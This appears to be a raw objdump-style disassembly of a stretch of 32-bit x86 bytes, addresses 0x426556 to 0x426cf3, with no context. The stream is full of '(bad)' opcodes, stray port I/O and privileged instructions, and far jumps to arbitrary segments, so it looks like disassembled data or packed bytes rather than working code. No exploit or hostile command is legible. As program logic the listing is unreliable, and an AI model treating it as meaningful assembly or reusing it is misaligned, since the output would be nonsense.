  426556:	push   ecx
  426557:	fistp  QWORD PTR [ebp+0x4d764a5d]
  42655d:	cs out 0x52,al
  426560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426561:	mov    DWORD PTR [ecx+0x54],eax
  426564:	adc    eax,DWORD PTR [ebp-0x37]
  426567:	push   ds
  426568:	fdivrp st(0),st
  42656a:	pop    eax
  42656b:	je     0x4265c1
  42656d:	sahf   
  42656e:	inc    edi
  42656f:	dec    ebp
  426570:	push   ecx
  426571:	lds    esp,FWORD PTR [ecx]
  426573:	cld    
  426574:	hlt    
  426575:	dec    esp
  426576:	pushf  
  426577:	and    eax,0xff205c16
  42657c:	sub    BYTE PTR [esi+0x61e4247e],bl
  426582:	daa    
  426583:	test   DWORD PTR [edx+0x4c82924a],0x641b19bb
  42658d:	jp     0x4265e3
  42658f:	xchg   ebp,eax
  426590:	dec    ecx
  426591:	aad    0x69
  426593:	ret    
  426594:	add    ebx,DWORD PTR [edi+0x30]
  426597:	icebp  
  426598:	(bad)  
  426599:	jmp    0x4265a1
  42659b:	xor    DWORD PTR [eax],ecx
  42659d:	aaa    
  42659e:	rol    BYTE PTR [edi-0x47],1
  4265a1:	or     DWORD PTR [edi-0x74],edx
  4265a4:	es mov bl,0x6f
  4265a7:	and    al,0x18
  4265a9:	jne    0x426545
  4265ab:	icebp  
  4265ac:	push   0xa4dd8697
  4265b1:	and    edi,DWORD PTR [eax+eax*1]
  4265b4:	pop    edi
  4265b5:	jo     0x426551
  4265b7:	xchg   esi,eax
  4265b8:	(bad)  
  4265b9:	and    ch,BYTE PTR [esi+0x37230fef]
  4265bf:	mov    eax,0x560e34b3
  4265c4:	mov    eax,ds:0xb085d03b
  4265c9:	pop    ds
  4265ca:	(bad)  
  4265cb:	frstor ds:0x60a5ff97
  4265d1:	gs mov edi,0x21c9c9bc
  4265d7:	ins    BYTE PTR es:[edi],dx
  4265d8:	adc    DWORD PTR [ebp-0x3883cbe3],edi
  4265de:	cwde   
  4265df:	test   BYTE PTR [ebp+0x6dbffdcf],al
  4265e5:	test   BYTE PTR [ecx],0xc
  4265e8:	mov    ds:0xe46c14ea,al
  4265ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265ee:	sti    
  4265ef:	ins    DWORD PTR es:[edi],dx
  4265f0:	inc    edx
  4265f1:	mov    eax,esi
  4265f3:	mov    ah,al
  4265f5:	(bad)  
  4265f6:	retf   
  4265f7:	add    BYTE PTR [ecx+eax*4],al
  4265fa:	cmp    DWORD PTR [ebp+0x3941477e],ecx
  426600:	repnz sub bp,WORD PTR [eax]
  426604:	data16 jmp 0x4265cf
  426607:	call   0x332c:0x2c4cbfb0
  42660e:	scas   eax,DWORD PTR es:[edi]
  42660f:	(bad)  
  426610:	push   esi
  426611:	out    dx,al
  426612:	pusha  
  426613:	adc    DWORD PTR [ebp+esi*4-0x4e7fa8ed],0xf43a4631
  42661e:	mov    ds:0xd61fc1ca,eax
  426623:	(bad)  
  426624:	sahf   
  426625:	in     eax,dx
  426626:	inc    ebx
  426627:	test   DWORD PTR [ecx-0x2d796faa],eax
  42662d:	stos   BYTE PTR es:[edi],al
  42662e:	das    
  42662f:	(bad)  
  426630:	mov    esi,0xec9106b5
  426635:	lods   al,BYTE PTR ds:[esi]
  426636:	dec    esi
  426637:	shl    BYTE PTR [ebx+ebx*2+0x26],1
  42663b:	fsubr  DWORD PTR [esi-0x16]
  42663e:	or     DWORD PTR [edx-0x3],edi
  426641:	pop    esp
  426642:	inc    esp
  426643:	or     BYTE PTR [ebp-0x1d],al
  426646:	xor    DWORD PTR [ecx-0x2970faa7],ebx
  42664c:	retf   
  42664d:	pop    ebp
  42664e:	dec    edi
  42664f:	pop    ss
  426650:	mov    ?,WORD PTR [edi-0x2cdf2967]
  426656:	jae    0x4266c7
  426658:	cmp    eax,0xf144085d
  42665d:	fild   DWORD PTR [eax+0x5b85872f]
  426663:	add    bl,bl
  426665:	and    BYTE PTR [edi+0x11960a6e],0xd3
  42666c:	lahf   
  42666d:	inc    ebx
  42666e:	sbb    al,0x5
  426670:	sub    ebp,DWORD PTR [eax+ebp*4+0x3a]
  426674:	mov    edx,0x529aede8
  426679:	retf   
  42667a:	push   edi
  42667b:	test   al,0x3c
  42667d:	cld    
  42667e:	mov    ah,0x14
  426680:	dec    edi
  426681:	cmp    DWORD PTR [ecx+0x4f2a7b87],eax
  426687:	in     eax,dx
  426688:	adc    dh,BYTE PTR [ebx+0x16]
  42668b:	rcl    DWORD PTR [edi-0x7],0xe2
  42668f:	repz in al,dx
  426691:	cmp    DWORD PTR [eax+0x473b164f],0x48
  426698:	dec    BYTE PTR es:[esp+edi*8-0x5f654725]
  4266a0:	sbb    eax,0x5fc4639a
  4266a5:	lods   al,BYTE PTR ds:[esi]
  4266a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266a7:	bound  edx,QWORD PTR [ecx]
  4266a9:	rcr    edi,0x7c
  4266ac:	and    bl,bh
  4266ae:	cli    
  4266af:	sbb    al,0x6c
  4266b1:	push   0x7e657875
  4266b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266b9:	dec    ebx
  4266ba:	and    DWORD PTR [edx-0x51],eax
  4266bd:	xor    ah,dl
  4266bf:	(bad)  
  4266c0:	outs   dx,DWORD PTR es:[esi]
  4266c2:	in     eax,dx
  4266c3:	push   ebp
  4266c4:	sti    
  4266c5:	or     BYTE PTR [eax-0xd],ch
  4266c8:	mov    dl,0x2a
  4266ca:	jp     0x4266f7
  4266cc:	adc    BYTE PTR [edx+esi*2-0x5d],dh
  4266d0:	pop    ebx
  4266d1:	ja     0x4266fc
  4266d3:	dec    ebp
  4266d4:	sbb    al,BYTE PTR [eax+0xe]
  4266d7:	and    BYTE PTR ds:0x38ccc612,ch
  4266dd:	mov    ebx,0xc1ea406c
  4266e2:	icebp  
  4266e3:	cmp    BYTE PTR [edi],cl
  4266e5:	cwde   
  4266e6:	dec    ecx
  4266e7:	stos   DWORD PTR es:[edi],eax
  4266e8:	mov    ch,0xd
  4266ea:	aas    
  4266eb:	inc    ebp
  4266ec:	shl    ah,0x96
  4266ef:	rcr    DWORD PTR [ebx-0x22],0x23
  4266f3:	dec    BYTE PTR [ebx-0x65]
  4266f6:	loope  0x4266c5
  4266f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4266f9:	and    al,0xad
  4266fb:	jg     0x42674d
  4266fd:	(bad)  
  4266fe:	dec    ecx
  4266ff:	or     al,0xd4
  426701:	scas   al,BYTE PTR es:[edi]
  426702:	(bad)  
  426703:	outs   dx,BYTE PTR ds:[esi]
  426704:	(bad)  
  426706:	adc    eax,DWORD PTR [ebp+0x42]
  426709:	ja     0x42670b
  42670b:	dec    esi
  42670c:	sbb    WORD PTR [edi],0x8971
  426711:	jmp    DWORD PTR [edi+esi*2+0x72]
  426715:	ret    0xdbcd
  426718:	mov    ds:0xcd77bd3e,al
  42671d:	ins    BYTE PTR es:[edi],dx
  42671e:	xchg   ecx,eax
  42671f:	mov    dh,0xdd
  426721:	mov    eax,ds:0xe54d8866
  426726:	jb     0x4267a4
  426728:	(bad)  
  42672a:	pop    edx
  42672b:	mov    ch,0x67
  42672d:	inc    ecx
  42672e:	xchg   esi,eax
  42672f:	xor    eax,0xdacb76d8
  426734:	sbb    eax,DWORD PTR [edi]
  426736:	mov    DWORD PTR [ebp+ebp*8-0x19],edi
  42673a:	jle    0x426747
  42673c:	cmp    al,0xe2
  42673e:	shl    BYTE PTR [ebx+0x76],cl
  426741:	cmp    BYTE PTR [bx+si-0x1674],dh
  426746:	shl    dh,cl
  426748:	loop   0x4266e3
  42674a:	push   edx
  42674b:	out    dx,al
  42674c:	xor    DWORD PTR [ebx+0x54733c25],ebx
  426752:	loope  0x426717
  426754:	in     eax,0xc
  426756:	popf   
  426757:	stos   DWORD PTR es:[edi],eax
  426758:	sub    al,0xc4
  42675a:	popa   
  42675b:	push   ds
  42675c:	aad    0x2d
  42675e:	adc    BYTE PTR [edx+0x2a],bh
  426761:	sub    DWORD PTR [edi-0x33],edi
  426764:	imul   eax,DWORD PTR [esi+0x77445e52],0x39
  42676b:	sub    al,0x5e
  42676d:	jno    0x426703
  42676f:	push   edi
  426770:	jbe    0x4266f2
  426772:	imul   esi,DWORD PTR [eax-0x13]
  426776:	in     al,dx
  426777:	xchg   BYTE PTR [ebp-0x3a],dh
  42677a:	cmp    DWORD PTR [ebx-0x42],0x1a
  42677e:	clc    
  42677f:	push   es
  426780:	xchg   esp,eax
  426781:	jmp    0xc698313c
  426786:	enter  0x8f25,0x99
  42678a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42678b:	xchg   ebp,eax
  42678c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42678d:	mov    ebp,ebp
  42678f:	in     eax,0xf0
  426791:	pop    ds
  426792:	cmp    eax,0x5c670e81
  426797:	inc    edx
  426798:	cwde   
  426799:	cmp    al,0x6
  42679b:	aad    0x20
  42679d:	jp     0x42681d
  42679f:	xchg   esi,eax
  4267a0:	fadd   DWORD PTR [esi-0x235974f4]
  4267a6:	test   al,0x97
  4267a8:	mov    esp,0x795fb90e
  4267ad:	idiv   BYTE PTR [edi]
  4267af:	jg     0x4267ce
  4267b1:	in     eax,dx
  4267b2:	push   0x54
  4267b4:	int    0x95
  4267b6:	cmp    edx,DWORD PTR [esi]
  4267b8:	or     DWORD PTR [eax],eax
  4267ba:	add    BYTE PTR [eax],al
  4267bc:	cli    
  4267bd:	rcl    DWORD PTR ds:0xfac73d07,cl
  4267c3:	push   DWORD PTR ds:0xfa1c7bfe
  4267c9:	in     al,0xfa
  4267cb:	and    esi,edx
  4267cd:	fild   WORD PTR [ecx]
  4267cf:	add    BYTE PTR [ebp-0x67fffffe],al
  4267d5:	enter  0x533d,0x7f
  4267d9:	loop   0x4267e4
  4267db:	push   es
  4267dc:	push   es
  4267dd:	sbb    ecx,DWORD PTR [edi+0x5a]
  4267e0:	not    bh
  4267e2:	xchg   BYTE PTR [ecx],ah
  4267e4:	ja     0x4267ae
  4267e6:	cwde   
  4267e7:	addr16 xchg ebp,eax
  4267e9:	sbb    eax,0xb16ad384
  4267ee:	xchg   DWORD PTR [ebp+0x52],edi
  4267f1:	sub    dh,0xef
  4267f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267f5:	(bad)  
  4267f6:	mov    ds:0xe05288f2,eax
  4267fb:	imul   edi,DWORD PTR [eax-0x1c3f2b7c],0x66
  426802:	fidiv  DWORD PTR [edx+0x5620366b]
  426808:	test   al,0x69
  42680a:	out    0x2e,al
  42680c:	retf   0xd60d
  42680f:	test   BYTE PTR [edi-0x6f],dh
  426812:	bound  ebx,QWORD PTR [edi]
  426814:	mov    ebp,eax
  426816:	mov    esp,0xcc9ce7e5
  42681b:	push   eax
  42681c:	mov    ecx,eax
  42681e:	push   0x105ffa83
  426823:	and    BYTE PTR [edx+0x5aaa4366],cl
  426829:	or     dh,BYTE PTR [esi]
  42682b:	dec    eax
  42682c:	call   0xf4bc:0xf8ae4b
  426833:	js     0x42683f
  426835:	cmp    ebx,DWORD PTR [edi+0x67]
  426838:	ror    al,cl
  42683a:	sub    edx,edx
  42683c:	or     al,0xdf
  42683e:	loop   0x426867
  426840:	nop
  426841:	das    
  426842:	iret   
  426843:	je     0x4267fa
  426845:	mov    cl,0x3e
  426847:	arpl   cx,ax
  426849:	pop    edx
  42684a:	or     eax,0x61ed2fe1
  42684f:	push   ds
  426850:	or     al,0xd4
  426852:	adc    cl,dh
  426854:	gs pop ebp
  426856:	(bad)  
  426857:	mov    al,BYTE PTR [ebx-0x15]
  42685a:	test   DWORD PTR [esi],0x5dbe7ed7
  426860:	popa   
  426861:	test   ebx,edi
  426863:	ds js  0x426899
  426866:	add    BYTE PTR [ecx+0x1],bl
  426869:	xchg   DWORD PTR [edi],esi
  42686b:	add    DWORD PTR ds:0xc6f8611e,eax
  426871:	(bad)  
  426872:	retf   0x947b
  426875:	mov    ecx,?
  426877:	test   al,0xb0
  426879:	fwait
  42687a:	cld    
  42687b:	rcl    DWORD PTR [eax+eiz*1-0xc],0x85
  426880:	(bad)  
  426881:	sahf   
  426882:	mov    esp,0x5c3e49d4
  426887:	inc    esp
  426888:	inc    edi
  426889:	pop    esp
  42688a:	mov    al,ds:0x55407799
  42688f:	js     0x4268fd
  426891:	jb     0x4268c5
  426893:	jp     0x42686d
  426895:	in     al,dx
  426896:	inc    ecx
  426897:	inc    ecx
  426898:	mov    esp,0x63ca1737
  42689d:	cmp    al,0x2c
  42689f:	adc    DWORD PTR [esi+0x1dca4df9],eax
  4268a5:	sbb    ebx,ebp
  4268a7:	scas   eax,DWORD PTR es:[edi]
  4268a8:	mov    ds:0x958fa498,eax
  4268ad:	hlt    
  4268ae:	xchg   DWORD PTR [esi-0x5dedb721],ecx
  4268b4:	push   es
  4268b5:	jbe    0x4268fc
  4268b7:	cmp    BYTE PTR [ebx],dh
  4268b9:	mov    dl,0x45
  4268bb:	fwait
  4268bc:	and    DWORD PTR [eax],0xffffff9a
  4268bf:	retf   0x17d7
  4268c2:	fnstenv [esi-0x291e9028]
  4268c8:	js     0x426942
  4268ca:	mov    dh,0xec
  4268cc:	fist   DWORD PTR [ebp+0x223a30f4]
  4268d2:	mov    bh,0x6c
  4268d4:	push   0xfc8123c
  4268d9:	push   eax
  4268da:	fidiv  WORD PTR [edi-0x30]
  4268dd:	jp     0x4268df
  4268df:	mov    ah,0x85
  4268e1:	jp     0x4268bb
  4268e3:	jo     0x426939
  4268e5:	xchg   esp,eax
  4268e6:	push   0x9
  4268e8:	cld    
  4268e9:	mov    bl,0xcc
  4268eb:	inc    esi
  4268ec:	neg    BYTE PTR [eax]
  4268ee:	fdivr  DWORD PTR [ebx+eiz*1+0x6d]
  4268f2:	xor    bl,BYTE PTR [eax+0x2e]
  4268f5:	outs   dx,DWORD PTR ds:[esi]
  4268f6:	mov    esi,0x20a7ec73
  4268fb:	addr16 int3 
  4268fd:	test   al,0x56
  4268ff:	ret    0x8590
  426902:	add    dl,bl
  426904:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426905:	ins    BYTE PTR es:[edi],dx
  426906:	adc    eax,0x9157b8c8
  42690b:	xchg   ebx,eax
  42690c:	jb     0x42694f
  42690e:	mov    esi,DWORD PTR [esi-0x5b624bb2]
  426914:	push   es
  426915:	jge    0x4268a3
  426917:	push   ds
  426918:	ins    BYTE PTR es:[edi],dx
  426919:	stos   DWORD PTR es:[edi],eax
  42691a:	ja     0x426952
  42691c:	and    eax,0x1f4a863d
  426921:	(bad)  
  426922:	(bad)  
  426923:	aad    0xfd
  426925:	sub    eax,0x18732676
  42692a:	shl    edx,cl
  42692c:	dec    edi
  42692d:	daa    
  42692e:	adc    BYTE PTR [esi+0x57],0xab
  426932:	adc    ch,BYTE PTR [edi+0x751215d4]
  426938:	dec    ebp
  426939:	sahf   
  42693a:	mov    ch,0xc3
  42693c:	stc    
  42693d:	and    eax,0xb0311aba
  426942:	sbb    al,BYTE PTR [edi+ecx*2+0xe92621e]
  426949:	aam    0x36
  42694b:	test   DWORD PTR [ebx+edx*4-0x15],esi
  42694f:	psrlw  mm5,QWORD PTR [ecx+0x7cc1856]
  426956:	jnp    0x4269cb
  426958:	xchg   DWORD PTR [ebx+0xd],ebx
  42695b:	out    0x52,al
  42695d:	cmc    
  42695e:	mov    edi,0x2116b501
  426963:	sub    al,0x71
  426965:	lahf   
  426966:	rcr    BYTE PTR [ebp+0x2c],cl
  426969:	(bad)  
  42696a:	jnp    0x42695e
  42696c:	pop    edi
  42696d:	test   DWORD PTR [edi-0x36],ebp
  426970:	je     0x4269a8
  426972:	cld    
  426973:	scas   al,BYTE PTR es:[edi]
  426974:	aad    0xe1
  426976:	test   ah,dh
  426978:	mov    BYTE PTR [edx+0x42],dl
  42697b:	push   edi
  42697c:	out    dx,al
  42697d:	pop    esp
  42697e:	aad    0x75
  426980:	jge    0x4269d4
  426982:	sbb    BYTE PTR [esi],dl
  426984:	(bad)  
  426985:	iret   
  426986:	ins    DWORD PTR es:[edi],dx
  426987:	ja     0x42690a
  426989:	xlat   BYTE PTR ds:[ebx]
  42698a:	dec    ebp
  42698b:	pop    ebx
  42698c:	stos   BYTE PTR es:[edi],al
  42698d:	fistp  WORD PTR [ebx-0x5d3e1117]
  426993:	push   cs
  426994:	scas   eax,DWORD PTR es:[edi]
  426995:	mov    ebp,0x4b24b51
  42699b:	into   
  42699c:	rep stos BYTE PTR es:[edi],al
  42699e:	push   edi
  42699f:	jno    0x426991
  4269a1:	xor    dh,BYTE PTR [ebx+0x2c772a7e]
  4269a7:	scas   al,BYTE PTR es:[edi]
  4269a8:	sbb    ah,cl
  4269aa:	jmp    0x426973
  4269ac:	push   edx
  4269ad:	mov    al,ds:0xed1b497d
  4269b2:	add    al,0x98
  4269b4:	ins    BYTE PTR es:[edi],dx
  4269b5:	sub    al,0x5f
  4269b7:	mov    DWORD PTR [ebx-0x2],eax
  4269ba:	add    DWORD PTR [esi+0x3da1ddc0],edi
  4269c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269c1:	ins    DWORD PTR es:[edi],dx
  4269c2:	fwait
  4269c3:	cs scas eax,DWORD PTR es:[edi]
  4269c5:	ds inc esi
  4269c7:	rcr    DWORD PTR fs:[eax],0x22
  4269cb:	add    ebp,ebp
  4269cd:	retf   
  4269ce:	retf   0xfb84
  4269d1:	ins    DWORD PTR es:[edi],dx
  4269d2:	pop    ds
  4269d3:	pop    ds
  4269d4:	shl    BYTE PTR [edi-0x11],cl
  4269d7:	cmp    BYTE PTR [edi-0x13392bdc],al
  4269dd:	outs   dx,DWORD PTR ds:[esi]
  4269de:	js     0x4269da
  4269e0:	jg     0x4269d1
  4269e2:	pop    edi
  4269e3:	imul   eax,esi,0x18
  4269e6:	pop    eax
  4269e7:	push   edx
  4269e8:	and    BYTE PTR [ecx+0x4f],0x24
  4269ec:	cdq    
  4269ed:	cmp    bl,BYTE PTR [esi-0x4708ff2f]
  4269f3:	into   
  4269f4:	pop    ss
  4269f5:	and    al,ch
  4269f7:	inc    edx
  4269f8:	shl    ecx,0x65
  4269fb:	jge    0x4269b3
  4269fd:	push   0xffffffdb
  4269ff:	stc    
  426a00:	mov    dh,al
  426a02:	sub    al,0x70
  426a04:	fsub   DWORD PTR [ebp+esi*8-0x5cd56d5a]
  426a0b:	rol    BYTE PTR [ecx-0x27],cl
  426a0e:	cmp    ecx,0x764a95ea
  426a14:	mov    ds:0xdb436bfc,eax
  426a19:	mov    eax,0xa2fc6a30
  426a1e:	aam    0x1b
  426a20:	mov    bl,0x1a
  426a22:	test   bh,al
  426a24:	mov    ebp,0xa958ca08
  426a29:	data16 and al,0x49
  426a2c:	mov    WORD PTR [esp+ebx*4+0x6a060722],ss
  426a33:	push   ebp
  426a34:	xor    eax,0x3cb4e718
  426a39:	add    ch,0x25
  426a3c:	inc    edx
  426a3d:	adc    edi,DWORD PTR [edi-0x1f]
  426a40:	jmp    ebp
  426a42:	or     DWORD PTR [edi-0x29],0xffffffc2
  426a46:	icebp  
  426a47:	xchg   ebx,eax
  426a48:	and    bh,bl
  426a4a:	rcr    BYTE PTR [ebx-0x6a96fb88],cl
  426a50:	lock or BYTE PTR [ebx+0x6ffa376b],al
  426a57:	data16 add al,BYTE PTR [eax]
  426a5a:	add    BYTE PTR [eax],al
  426a5c:	iret   
  426a5d:	neg    BYTE PTR [ebp-0x308442b0]
  426a63:	(bad)  
  426a64:	out    dx,eax
  426a65:	lods   al,BYTE PTR ds:[esi]
  426a66:	(bad)  
  426a67:	push   ss
  426a68:	pop    es
  426a69:	and    DWORD PTR [esi],eax
  426a6b:	nop
  426a6c:	ja     0x426a50
  426a6e:	add    DWORD PTR [eax],eax
  426a70:	test   DWORD PTR [edx],eax
  426a72:	add    BYTE PTR [eax],al
  426a74:	push   cs
  426a75:	inc    ebp
  426a76:	idiv   BYTE PTR [ebx-0x1c0c1128]
  426a7c:	xor    eax,0x6a1d4164
  426a81:	nop
  426a82:	cdq    
  426a83:	jo     0x426a20
  426a85:	ror    edi,1
  426a87:	add    eax,0xfb4be5e2
  426a8c:	loop   0x426afc
  426a8e:	push   ds
  426a8f:	and    al,0xbc
  426a91:	fwait
  426a92:	jmp    0x1297:0x18ceaaaf
  426a99:	add    eax,DWORD PTR [esi-0xb6cfb01]
  426a9f:	call   0xd219:0x324cca1a
  426aa6:	sub    dh,BYTE PTR [edi]
  426aa8:	cwde   
  426aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426aaa:	inc    esi
  426aab:	ins    DWORD PTR es:[edi],dx
  426aac:	hlt    
  426aad:	in     al,0xe5
  426aaf:	cdq    
  426ab0:	fwait
  426ab1:	xor    DWORD PTR [ebx-0x53615932],0xa90fc8e2
  426abb:	xlat   BYTE PTR ds:[ebx]
  426abc:	arpl   WORD PTR [edx+0x230c4a58],bx
  426ac2:	int    0xc7
  426ac4:	repnz popf 
  426ac6:	lods   al,BYTE PTR ds:[esi]
  426ac7:	out    0xe5,al
  426ac9:	rcl    BYTE PTR [edi],1
  426acb:	jp     0x426b27
  426acd:	jp     0x426b14
  426acf:	fsubr  DWORD PTR [esi+ecx*1+0x11]
  426ad3:	pop    esi
  426ad4:	repz sub BYTE PTR [ecx-0x3ce255c7],0xa7
  426adc:	mov    ah,0xcb
  426ade:	(bad)
  426ae1:	pop    ss
  426ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ae3:	es dec ebx
  426ae5:	pusha  
  426ae6:	cld    
  426ae7:	jno    0x426afe
  426ae9:	push   ds
  426aea:	sub    DWORD PTR [ebx+edx*4+0x5cc39f72],edx
  426af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af2:	pop    eax
  426af3:	nop
  426af4:	xor    ebx,esp
  426af6:	mov    ebp,0x10208198
  426afb:	faddp  st(3),st
  426afd:	or     BYTE PTR [ebx-0x5d],ah
  426b00:	imul   ecx,eax,0xffffff9e
  426b03:	push   eax
  426b04:	adc    al,0x44
  426b06:	popa   
  426b07:	mov    ah,0xa7
  426b09:	push   cs
  426b0a:	ss push ecx
  426b0c:	loope  0x426ac2
  426b0e:	call   0x87f1:0x641c75c1
  426b15:	push   esi
  426b16:	pop    edx
  426b17:	sub    DWORD PTR [esi-0x1e9155a9],eax
  426b1d:	xchg   edx,eax
  426b1e:	(bad)  
  426b1f:	sahf   
  426b20:	inc    esi
  426b21:	push   edi
  426b22:	dec    ecx
  426b23:	sbb    esi,DWORD PTR [esi]
  426b25:	popf   
  426b26:	mov    ds:0x351f18dc,al
  426b2b:	mov    ah,ch
  426b2d:	int3   
  426b2e:	ins    BYTE PTR es:[edi],dx
  426b2f:	ret    
  426b30:	jecxz  0x426b6f
  426b32:	push   ds
  426b33:	push   ss
  426b34:	int3   
  426b35:	xor    DWORD PTR [ebx-0x3829088c],0xffffffb5
  426b3c:	bound  esi,QWORD PTR [ecx-0x43d7870b]
  426b42:	out    0xf2,eax
  426b44:	int    0xb5
  426b46:	sub    esi,DWORD PTR [ebx-0x65]
  426b49:	mov    ebp,0x36290bd8
  426b4e:	or     ecx,esi
  426b50:	sbb    cl,ch
  426b52:	dec    esp
  426b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b54:	add    al,0x8b
  426b56:	xor    cl,BYTE PTR [eax+0x1cf9a600]
  426b5c:	enter  0x22de,0xe4
  426b60:	sub    eax,0x3c060b6c
  426b65:	cmc    
  426b66:	mov    ebp,0xc8ec595
  426b6b:	sub    ebx,eax
  426b6d:	nop
  426b6e:	nop
  426b6f:	mov    esi,0x3fc8da4b
  426b74:	lahf   
  426b75:	dec    eax
  426b76:	mov    bl,0xff
  426b78:	std    
  426b79:	jl     0x426bcd
  426b7b:	pop    edi
  426b7c:	and    al,ch
  426b7e:	sbb    al,bh
  426b80:	pop    edi
  426b81:	mov    al,ds:0x6bcf72b4
  426b86:	popf   
  426b87:	ja     0x426b80
  426b89:	ret    
  426b8a:	iret   
  426b8b:	xchg   ebx,eax
  426b8c:	fcmovne st,st(5)
  426b8e:	test   BYTE PTR [edi],ch
  426b90:	xor    eax,0xc72cd19c
  426b95:	jl     0x426bb3
  426b97:	pop    ebp
  426b98:	add    al,0xf0
  426b9a:	push   ebp
  426b9b:	pop    edi
  426b9c:	xchg   BYTE PTR [esi],dh
  426b9e:	sti    
  426b9f:	cmc    
  426ba0:	(bad)  
  426ba1:	shl    ebx,0x9a
  426ba4:	xchg   edx,eax
  426ba5:	outs   dx,BYTE PTR ds:[esi]
  426ba6:	pop    es
  426ba7:	jecxz  0x426b54
  426ba9:	jl     0x426b51
  426bab:	data16 mov al,ds:0x82f21a4d
  426bb1:	add    eax,0xf8323c27
  426bb6:	lock ins DWORD PTR es:[edi],dx
  426bb8:	sub    BYTE PTR [ecx+edi*2+0x535c95a2],bl
  426bbf:	sbb    edi,edi
  426bc1:	imul   ebp,DWORD PTR [edx-0x6],0x70
  426bc5:	push   edx
  426bc6:	dec    esp
  426bc7:	xchg   DWORD PTR [edi+0x3],edi
  426bca:	loope  0x426c48
  426bcc:	xchg   edi,eax
  426bcd:	outs   dx,DWORD PTR ds:[esi]
  426bce:	repz pusha 
  426bd0:	outs   dx,DWORD PTR ds:[esi]
  426bd1:	xor    DWORD PTR [ecx-0x359152b4],ecx
  426bd7:	hlt    
  426bd8:	mov    bh,0x8
  426bda:	fnstenv [eax+0x21c8037f]
  426be0:	and    eax,0x6a8351c6
  426be5:	pushf  
  426be6:	fldlg2 
  426be8:	in     eax,dx
  426be9:	dec    esi
  426bea:	data16 int 0xb9
  426bed:	adc    BYTE PTR [edi+0x5cd9791f],cl
  426bf3:	add    edx,DWORD PTR [edx+0x62]
  426bf6:	push   ss
  426bf7:	xor    DWORD PTR [edi],ecx
  426bf9:	pop    ss
  426bfa:	mov    dl,0x26
  426bfc:	sub    eax,0x771e6cf3
  426c01:	iret   
  426c02:	sbb    DWORD PTR [ebx-0x787d310a],0x1e9f7f94
  426c0c:	idiv   DWORD PTR [ebx]
  426c0e:	xor    bl,0x82
  426c11:	dec    esi
  426c12:	loope  0x426b9e
  426c14:	movntq QWORD PTR [edi+0x1a],mm0
  426c18:	mov    gs,WORD PTR [ebx+0x545977c1]
  426c1e:	jp     0x426bdd
  426c20:	inc    ecx
  426c21:	pop    eax
  426c22:	loope  0x426c8c
  426c24:	push   0xffffffdc
  426c26:	push   ecx
  426c27:	pop    edx
  426c28:	adc    al,0x9b
  426c2a:	lahf   
  426c2b:	mov    al,BYTE PTR [ecx-0x1aabc5ab]
  426c31:	jg     0x426c35
  426c33:	in     al,dx
  426c34:	push   eax
  426c35:	jmp    0x77200c3e
  426c3a:	sub    al,0x1b
  426c3c:	pop    edx
  426c3d:	push   ebp
  426c3e:	std    
  426c3f:	and    al,0xc7
  426c41:	inc    esi
  426c42:	inc    edx
  426c43:	xlat   BYTE PTR ds:[ebx]
  426c44:	(bad)  
  426c45:	adc    ebp,DWORD PTR [esp+ebx*8-0xa]
  426c49:	iret   
  426c4a:	test   al,0x45
  426c4c:	and    ch,bl
  426c4e:	(bad)  
  426c4f:	xor    DWORD PTR [ecx],esp
  426c51:	pop    ss
  426c52:	sub    al,0x86
  426c54:	sub    BYTE PTR [esi],0x31
  426c57:	and    al,0x51
  426c59:	data16 arpl WORD PTR [ecx],dx
  426c5c:	lock cmp dl,al
  426c5f:	fbld   TBYTE PTR [eax-0x43]
  426c62:	(bad)  [esi]
  426c64:	pop    esp
  426c65:	inc    esi
  426c66:	inc    esi
  426c67:	icebp  
  426c68:	lods   eax,DWORD PTR ds:[esi]
  426c69:	push   esi
  426c6a:	ficom  WORD PTR [eax-0x14123d45]
  426c70:	test   DWORD PTR [ebx-0x36],edx
  426c73:	jg     0x426c06
  426c75:	jb     0x426c84
  426c77:	mov    esp,0xc4cfcb5f
  426c7c:	pop    ds
  426c7d:	xor    DWORD PTR [ecx+0x72edc267],esi
  426c83:	out    0xea,al
  426c85:	test   BYTE PTR [ecx+0x5e4f8c78],ch
  426c8b:	push   edx
  426c8c:	push   esi
  426c8d:	sbb    eax,0x6da3574b
  426c92:	clc    
  426c93:	gs xor eax,0x8d8e1520
  426c99:	rcr    BYTE PTR [ecx+0x26],1
  426c9c:	and    BYTE PTR [esi],0x5
  426c9f:	cmp    eax,0x8fe8f256
  426ca4:	mov    eax,0x8dc8e490
  426ca9:	jno    0x426c94
  426cab:	test   ecx,esi
  426cad:	push   esi
  426cae:	frstor [edx-0x328ab52b]
  426cb4:	test   al,0xc4
  426cb6:	jmp    0x27f29a98
  426cbb:	push   ds
  426cbc:	aad    0xd8
  426cbe:	add    ah,bh
  426cc0:	pop    DWORD PTR [esi-0x1255008a]
  426cc6:	ds fwait
  426cc8:	push   0xffffffed
  426cca:	xchg   edi,eax
  426ccb:	inc    ecx
  426ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ccd:	call   0x2a4cf88e
  426cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cd3:	mov    ecx,0xd39bb757
  426cd8:	jns    0x426caa
  426cda:	push   ebp
  426cdb:	ret    
  426cdc:	mov    ebp,0x6c0517ca
  426ce1:	inc    eax
  426ce2:	ret    0xe351
  426ce5:	ror    BYTE PTR [edx],cl
  426ce7:	mov    edi,0x203cbb4c
  426cec:	inc    ebx
  426ced:	je     0x426c7d
  426cef:	xrelease xchg DWORD PTR [ecx+0x59],edx
  426cf3:	push   ebp
